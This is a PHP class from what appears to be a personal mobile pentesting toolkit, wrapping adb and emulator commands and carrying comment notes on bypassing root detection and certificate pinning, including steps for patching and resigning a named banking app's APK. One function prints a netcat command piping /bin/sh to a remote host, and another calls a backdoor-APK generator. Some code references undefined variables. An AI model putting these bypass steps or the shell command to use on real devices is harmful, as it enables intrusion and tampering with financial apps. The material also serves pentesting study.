<?php





class android extends mobile{


    // https://developer.android.com/studio/command-line/adb
    /*
https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet
https://github.com/b-mueller/android_app_security_checklist
https://github.com/ashishb/android-security-awesome (tools)
https://github.com/vaib25vicky/awesome-mobile-security
https://github.com/abhi-r3v0/EVABS (labs)
https://github.com/tsug0d/AndroidMobilePentest101
https://github.com/vivekj2/mob-pentest
https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting
https://github.com/OWASP/owasp-mstg
https://github.com/kyawthiha7/Mobile-App-Pentest (LABS)
https://github.com/sh4hin/Androl4b  (LABS)
https://github.com/TheRipperJhon/Android_Pentest_Tools
https://github.com/MobSF/Mobile-Security-Framework-MobSF
https://github.com/mirfansulaiman/Command-Mobile-Penetration-Testing-Cheatsheet
https://github.com/jdonsec/AllThingsAndroid
https://gist.github.com/mrk-han/66ac1a724456cadf1c93f4218c6060ae
https://github.com/OWASP/owasp-mstg/tree/master/Crackmes


     */
    
    
    /*
    https://resources.infosecinstitute.com/android-hacking-security-part-8-root-detection-evasion/
    https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05j-testing-resiliency-against-reverse-engineering

    Intro : we will look at the techniques being used by Android developers to detect if a device on which the app is running is rooted or not. 
    There are good number of advantages for an application in detecting if it is running on a rooted device or not. 
    Most of the techniques we use to pentest an Android application require root permission to install various tools and hence to compromise the security of the application.
    Many Android applications do not run on rooted devices for security reasons. 
    I have seen some banking applications check for root-access and stop running if the device is rooted. 
     
     Once a device is rooted, some new files may be placed on the device. 
     Checking for those files and packages installed on the device is one way of finding out if a device is rooted or not. 
     Some developers may execute the commands which are accessible only to root users, and some may look for directories with elevated permissions. 
     I have listed few of these techniques below.

https://github.com/scottyab/rootbeer



    1- Superuser.apk is the most common package many apps look for in root detection. 
    This application allows other applications to run as root on the device.
    ls -al /system/app/Superuser.apk OR ls /system/app/ | grep super
    
    2- Many applications look for applications with specific package names. An example is show below.
    adb shell pm list packages | grep super 
    
    3 - There are some specific applications which run only on rooted devices. Checking for those applications would also be a good idea to detect if the device is rooted.

Example: Busybox.

Busybox is an application which provides a way to execute the most common Linux commands on your Android device.
busybox pwd 
    4 - Executing “su” and “id” commands and looking at the UID to see if it is root.
    
    5 - Checking the BUILD tag for test-keys: This check is generally to see if the device is running with a custom ROM. By default, Google gives ‘release-keys’ as its tag for stock ROMs. If it is something like “test-keys”, then it is most likely built with a custom ROM.
    adb shell cat system/build.prop | grep ro.build.tags 
    
    
         Bypass Root Check Using Xposed:
    1) Install Xposed https://repo.xposed.info/module/de.robv.android.xposed.installer
    2) Install “RootCloak” (Xposed Module)
    3) Open RootCloak > Add/Remove Apps > (select target app) and tap it.
    4) Done! (open app and check if it’s works)
     
     Most root detection techniques rely on checking for files on the OS that indicate the device has been rooted. Using GREP, search for any of the follow strings and change them to something random:
- Superuser
- Supersu
- /su
- /system/app/Superuser.apk
- /system/bin
- /system/bin/su
- /system/sd/xbin
- /system/xbin/su
- /system/xbin
- /data/local
- /data/local/bin
- /data/local/xbin
- /sbin
- /system/bin/failsafe
- /vendor/bin

/system/app/Superuser.apk
/system/etc/init.d/99SuperSUDaemon
/dev/com.koushikdutta.superuser.daemon/
/system/xbin/daemonsu

/sbin/su  
/system/bin/su  
/system/bin/failsafe/su  
/system/xbin/su  
/system/xbin/busybox  
/system/sd/xbin/su  
/data/local/su  
/data/local/xbin/su  
/data/local/bin/su

com.thirdparty.superuser
eu.chainfire.supersu
com.noshufou.android.su
com.koushikdutta.superuser
com.zachspong.temprootremovejb
com.ramdroid.appquarantine
com.topjohnwu.magisk

private boolean isTestKeyBuild()
{
String str = Build.TAGS;
if ((str != null) && (str.contains("test-keys")));
for (int i = 1; ; i = 0)
  return i;
}


Checking TracerPid
/proc/<pid>/status or /proc/self/status

$ adb shell ps -A | grep com.example.hellojni
u0_a271      11657   573 4302108  50600 ptrace_stop         0 t com.example.hellojni
$ adb shell cat /proc/11657/status | grep -e "^TracerPid:" | sed "s/^TracerPid:\t//"
TracerPid:      11839
$ adb shell ps -A | grep 11839
u0_a271  




Note: Other detection techniques look for any of the below-installed packages on the mobile device at runtime:
- supersu.apk
- Busybox
- Root Cloak
- Xpose framework
- Cydia
- Substrate

dex2jar Android.apk


    /home/rohff/Mobile-Security-Framework-MobSF-master/StaticAnalyzer/tools/jadx/bin/jadx '/home/rohff/0-Services/I10-android/APK/com-agb-agbonline1584331200.apk' -d /home/rohff/Desktop/AGB/APK/agb_jadx
     grep -rn '\.method public isRooted(' decompiled/smali
     grep -rn "/xbin/su" ./sources
     
     According to the Dalvik bytecode, if I want to return false I should use instructions as follow:
const/4 v0, 0x0
return v0

unzip com-agb-agbonline1584331200.apk -d ./agb_unzip
Delete the META-INF directory from the original APK to remove the old signature from the APK.

keytool -printcert -file ./agb_unzip/META-INF/CERT.RSA
dex2jar com-agb-agbonline1584331200.apk 

     java -jar /home/rohff/Mobile-Security-Framework-MobSF-master/StaticAnalyzer/tools/apktool_2.4.1.jar b ./com-agb-agbonline1584331200 agb.apk
     keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
     
     jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore -storepass password -keypass password  agb.apk alias_name
     /home/rohff/Android/Sdk/build-tools/30.0.0/apksigner sign -ks ./android.keystore ./decompiled/dist/ViewPGPkey.apk
 
 jarsigner -verify my.s.apk
     
         Bypass Certificate Pinning With “Xposed” module:
    If you need to bypass Certificate Pinning (in order to use the app with Burp Proxy for example) you can do this:
    1) Once you have Xposed installed on your phone, search for “SSLUnpinning” module. Install it.
    2) Open SSLUnpinning, look for the app on which you are trying to bypass the certificate pinning, and select it.
    
    
    apktool d -r  android.apk
    
    
    
        Root Detection – a set of techniques used to detect if a device on which the application is running is rooted or not. Many Android  applications simply do not run on rooted devices for security reasons, e.g.  MDM software or many banking applications.

    Certificate Pinning – a process of associating a host with its expected X.509 certificate.
    
    
    
     */
    public function __construct($stream,$device) {
		$device = trim($device);
		parent::__construct($stream,$device);
	}
	
	public function emulator4checkmount(){
	    $data = "mount ";
	    $filter = "";
	    $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	}
	
	public function emulator2mount(){
	    $data = "mount -o rw,remount -t yaffs /dev/block/mtdblock /system ";
	    $filter = "";
	    $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	}

	public function sdk2img2install($img):array{
	    $img = trim($img);
	    $data = "(sleep 2;echo 'y') | sdkmanager --install $img";
	    $filter = "| grep 'system-images;android-' | cut -d '|' -f1 | grep -i -Po [[:print:]]{1,}";
	    return $this->req_tab($this->stream, $data, $this->stream_timeout, $filter);
	}
	
	public function sdk2img4list():array{
	    $data = "sdkmanager --list ";
	    $filter = "| grep 'system-images;android-' | cut -d '|' -f1 | grep -i -Po [[:print:]]{1,}";
	    return $this->req_tab($this->stream, $data, $this->stream_timeout, $filter);
	}
	
	public function avd2start(){
	    $data = "emulator -netdelay none -netspeed full -avd $this->device_name -no-snapshot -show-kernel -verbose ";
	    $filter = "";
	    $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	    $this->pause();
	}

	public function avd2list4all(){
	    $data = "avdmanager list";
	    $filter = "";
	    $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	    $this->pause();
	}

	

	
	public function avd2list2target(){
	    $data = "avdmanager list target";
	    $filter = "";
	    $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	    $this->pause();
	}
	
	public function avd2list2device(){
	    $data = "avdmanager list device";
	    $filter = "";
	    $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	    $this->pause();
	}
	
	public function adb2phone4file($localfile,$remotepathPhoneDir){
	    $localfile = trim($localfile);
	    $remotepathPhoneDir = trim($remotepathPhoneDir);
	    $data = "adb -s $this->device_name push $localfile $remotepathPhoneDir";
	    $filter = "";
	    $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	    $this->pause();
	}
	
	public function adb8phone4file($remotepathPhonefile,$localdir){
	    $data = "adb -s $this->device_name pull $remotepathPhonefile $localdir";
	    $filter = "";
	    $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	    $this->pause();
	}
	
	public function adb2phone4app2profile($app){
	    $app = trim($app);
	    $data = "cmd package dump-profiles $app";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $this->adb8phone4file( "/data/misc/profman/$app.txt", "/tmp/");
	    
	}
	
	public function adb2phone4app2info($app){
	    $app = trim($app);
	    $data = "dump $app";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	    
	}
	    
	    public function adb2phone4app2open(){
	        $app = trim($app);
	        $data = "dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp'";
	        $filter = "";
	        return $this->adb2phone2exec($data, $filter);
	        
	    }
	    
	    
	public function adb2phone4app2meminfo($app){
	    $app = trim($app);
	    $data = "dumpsys meminfo $app";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	    
	}
	
	public function adb2phone2meminfo(){
	    $data = "dumpsys meminfo";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	public function adb2phone2list4task(){
	    $data = "dumpsys alarm";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	
	public function adb2phone2screenshot($outputname_png){
	    $data = "screencap $outputname_png";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	
	public function adb2phone2screenvideo($outputnamefilepathphone_mp4,$timelimit){
	    $data = "screenrecord $outputnamefilepathphone_mp4 --time-limit $timelimit";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	
	
	public function adb2phone2list4users(){
	    $data = "pm list users";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	
	public function adb2phone2list4permissions(){
	    $data = "pm list permissions -g -r";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	
	public function adb2phone2list4lib(){
	    $data = "pm list libraries";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	public function adb2phone2list4packages(){
	    $data = "pm list packages";
	    $filter = "| grep 'package:' | cut -d':' -f2 ";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	public function adb2phone2list4features(){
	    $data = "pm list features";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	public function adb2phone2list4activity(){
	    $data = "dumpsys activity intents";
	    $filter = "";
	    return $this->adb2phone2exec($data, $filter);
	}
	
	
	public function adb2phone2path4packagname($packagname){
	    $data = "pm path $packagname";
	    $filter = "";
	    return $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	}
	
	public function adb2phone2log(){
	    $data = "adb -s $this->device_name logcat";
	    $filter = "";
	    return $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	}
	
	public function adb2phone2install4apk($localfileAPK){
	    $data = "adb -s $this->device_name install $localfileAPK";
	    $filter = "";
	    return $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	}
	
	public function adb2phone2uninstall4app($app){
	    $data = "adb -s $this->device_name uninstall $app";
	    $filter = "";
	    return $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	}
	
	
	public function adb2phone2exec($cmd, $filter){
	    $cmd = trim($cmd);
	    $data = "adb -s $this->device_name shell $cmd";
	    return $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
	}
	
	public function adb2phone2url($url, $filter){
	    $url = trim($url);
	    
	    $data = "am start -a android.intent.action.VIEW -d $url";
	    $this->adb2phone2exec($data, $filter);
	}
	
	public function adb2phone4debug8gdb($remoteport,$cmd, $time){
	    $this->ssTitre("Debugging with gdb");
	    $cmd2 = "gdbserver localhost:$remoteport $cmd";
	    $cmd1 = "adb forward tcp:$remoteport tcp:$remoteport";
	    $this->exec_parallel($cmd1, $cmd2, $time);
	}
	
	public function adb2phone4hooking8frida($remoteport,$cmd, $time){
	    $this->ssTitre("Debugging with gdb");
	    $cmd2 = "frida-server localhost:$remoteport $cmd";
	    $cmd1 = "frida";
	    $this->exec_parallel($cmd1, $cmd2, $time);
	}
	
	public function adb2phone8info(){
	    $data = "cat /proc/version";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "cat /proc/iomem";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "cat /proc/version";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "netstat -tupan";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "services list";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "wm";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "svc";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "monkey";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "setprop";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);
	    $data = "lsof -i";
	    $filter = "";
	    $this->adb2phone2exec($data, $filter);


	}
	
function android_remote_device_connect(){
	$this->titre("for Phone");
	$this->cmd("Mobile","Settings > About Phone and tapping on the Build Number multiple times.");
	$this->cmd("Mobile","Settings -> Developer options. Then we can enable USB debugging.");
	$this->adb2devices();
	$this->requette("adb help");$this->pause();
	$this->ssTitre("GET SHELL");
 	$this->cmd("localhost","adb shell");
 	$this->cmd("shell@PGN611:/"," $ cat /proc/version");
 	//Linux version 3.18.19 (android@BIANYI-9) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Tue Nov 29 07:16:11 CST 2016
 	

 			
 	
 	$this->ssTitre("Memory Structure");
 	$this->cmd("shell@PGN611:/"," $ cat /proc/iomem");
 	$this->ssTitre("Memory Acquisition - Remote");
 	$this->cmd("localhost","adb push lime_ram.ko /sdcard/lime_ram.ko");
 	$this->cmd("localhost","adb forward tcp:4444 rcp:4444");
 	$this->cmd("localhost","adb shell");
 	$this->cmd("shell@PGN611:/","su");
 	$this->cmd("shell@PGN611:/","insmod /sdcard/lime_ram.ko \"path=tcp:4444 format=lime\" ");
 	$this->cmd("localhost","nc localhost 4444 > ram.lime ");
 	
 	$this->ssTitre("Memory Acquisition - Local");
 	$this->cmd("localhost","adb push lime_ram.ko /sdcard/lime_ram.ko ");
 	$this->cmd("localhost","adb shell");
 	$this->cmd("shell@PGN611:/","su");
 	$this->cmd("shell@PGN611:/","insmod /sdcard/lime_ram.ko \"path=/sdcard/dump_ram.lime format=lime\" ");
 	
	$this->ssTitre("Launch RCE");
	$this->cmd("localhost","~/android-sdks/platform-tools/adb -s WWLNHUONKZGM759L shell netstat -tupan");
	$this->ssTitre("Install APK File");
 	$this->cmd("localhost","~/android-sdks/platform-tools/adb -s WWLNHUONKZGM759L install '$this->dir_tools/mobile/HelloWorld.apk' ");
 	$this->ssTitre("Download any File");
 	$this->cmd("localhost","adb pull /data/app/[.apk file] [location]");
 	$this->pause();
 	$this->ssTitre("Interact With Framwork");
 	$this->cmd("shell@PGN611:/","services -h");
 	$this->cmd("shell@PGN611:/","services list");
 	$this->cmd("shell@PGN611:/","services call statusbar 1");
 	$this->cmd("shell@PGN611:/","services call statusbar 2");
 	$this->cmd("shell@PGN611:/","services call statusbar s16 bluetooth i32 1");
 	$this->cmd("shell@PGN611:/","services call statusbar s16 bluetooth i32 0");
 	$this->cmd("shell@PGN611:/","services call statusbar s16 alarm_clock i32 1");
 	$this->cmd("shell@PGN611:/","am start -a android.intent.action.VIEW -d http://pentesting.eu");
 	$this->cmd("shell@PGN611:/","pm list packages -f");
 	$this->cmd("shell@PGN611:/","wm");
 	$this->cmd("shell@PGN611:/","svc");
 	$this->cmd("shell@PGN611:/","monkey");
 	$this->cmd("shell@PGN611:/","setprop");
 	$this->ssTitre("Debugging with gdb");
 	$this->cmd("localhost","gdbserver localhost:2345 service list");
 	$this->cmd("localhost","adb forward tcp:2345 tcp:2345");
 	//Process service created; pid = 7822
 	//Listening on port 2345
 	
 	
 	$this->pause();
 	
 	$this->titre("for Emulatore");
 	$this->ssTitre("List AVDs");
 	$this->cmd("localhost","~/android-sdks/tools/android list avds");
 	$this->ssTitre("Launch AVD");
 	$this->cmd("localhost","~/android-sdks/tools/android avd");

 	//Available Android Virtual Devices:
 	//Name: test1
 	//Device: Nexus 4 (Google)
 	//Path: /home/rohff/.android/avd/test1.avd
 	//Target: Android 6.0 (API level 23)
 	//Tag/ABI: google_apis/armeabi-v7a
 	//Skin: HVGA
 	//Sdcard: 4000M
 	
 	$this->requette("gedit /home/rohff/.android/avd/test1.avd/emulator-user.ini");
 	$this->ssTitre("Capture Traffic & Dynamic Analyse");
 	$this->cmd("localhost","~/android-sdks/tools/emulator -avd testARM -http-proxy $this->proxy_addr:$this->proxy_port -tcpdump out.pcap ");
 	$this->cmd("localhost","java -jar burpsuite_free_v1.5.jar");
 	$this->ssTitre("GET EMULATOR NAME");
 	$this->requette(" adb devices -l");$this->pause();
 	$this->ssTitre("GET SHELL");
 	$this->cmd("localhost","adb -s emulator-5554 shell");
 	$this->ssTitre("INSTALL APK File");
 	$this->cmd("localhost","cd ~/android-sdk-linux/tools/; adb -s emulator-5554 install '$this->dir_tools/mobile/HelloWorld.apk'");
 	$this->ssTitre("Launch RCE");
 	$this->cmd("localhost","~/android-sdks/platform-tools/adb -s emulator-5554 shell netstat -tupan");
 	$this->cmd("localhost","nc -l 6666 -v");
 	$this->cmd("localhost","~/android-sdks/platform-tools/adb -s emulator-5554 shell 'nc $this->prof 6666  -v < /bin/sh' ");
 	$this->pause();
	
}

function android_malware_apk(){
	$this->gtitre("backdoor under android");
	// ##########################   APK  #######################################################
	//$backdoor_android = new malware4linux($this->prof,$this->prof, 8080,"$this->dir_tmp/backdoor_media_android.apk","");
	$backdoor_android->backdoor_media_android();
	$this->pause(); // 0 / 57	// thefatrat
	
}

public function adb2phone2buckup($buckupfilename, $filter){
    $this->ssTtitre("Backup");
    $buckupfilename = trim($buckupfilename);
    $data = "adb -s $this->device_name backup -all -f $buckupfilename.ab";
    return $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
}
public function adb2phone8buckup($pathbuckupfilename){
    $pathbuckupfilename = trim($pathbuckupfilename);
    $data = "adb -s $this->device_name restore $pathbuckupfilename";
    return $this->req_str($this->stream, $data, $this->stream_timeout, $filter);
}

public function android_install_rom(){
	$this->gtitre(__FUNCTION__);

	
	$this->article("Bootloader","Your bootloader is the lowest level of software on your phone, 
			running all the code that’s necessary to start your operating system. 
			Most bootloaders come locked, meaning you can’t flash custom recoveries or ROMs.
			Unlocking your bootloader doesn’t root your phone directly, but it does allow you to root and/or flash custom ROMs if you so desire.");
	$this->article("Recovery","Your recovery is the software on your phone that lets you make backups, flash ROMs, and perform other system-level tasks. 
			The default recovery on your phone can’t do much, but you can flash a custom recovery—like ClockworkMod or TWRP—after you’ve unlocked your bootloader that will give you much more control over your device. 
			This is often an integral part of the rooting process.");
	$this->article("Nandroid","From most third-party recovery modules, you can make backups of your phone called nandroid backups. 
			It’s essentially a system image of your phone: Everything exactly how it is right now. 
			That way, if you flash something that breaks your phone, you can just flash back to your most recent nandroid backup to return everything to normal. 
			This is different from using an app like Titanium Backup that just backs up apps and/or settings—nandroid backups backup the entire system as one image. 
			Titanium backups are best when switching between ROMs or phones.");
	$this->pause();

	//
	//
	$this->pause();
	
	$this->ssTitre("Recovery");
	$this->cmd("localhost","adb -s WWLNHUONKZGM759L push $this->dir_tools/mobile/twrp-3.1.1-0-condor.img /sdcard/twrp-3.1.1-0-condor.img");

	$this->cmd("localhost","adb reboot bootloader");
	$this->cmd("localhost","fastboot devices");
	//WWLNHUONKZGM759L	fastboot
	
	$this->cmd("localhost","fastboot flash recovery /sdcard/twrp-3.1.1-0-condor.img");
	$this->cmd("localhost","fastboot erase cache");
	
	$this->cmd("localhost","fastboot reboot");
	$this->pause();
	
	$this->cmd("localhost","");
	
	$this->article("","");
	$this->article("","");
	$this->article("","");
	$this->article("","");
	$this->article("","");

}


































}

?>
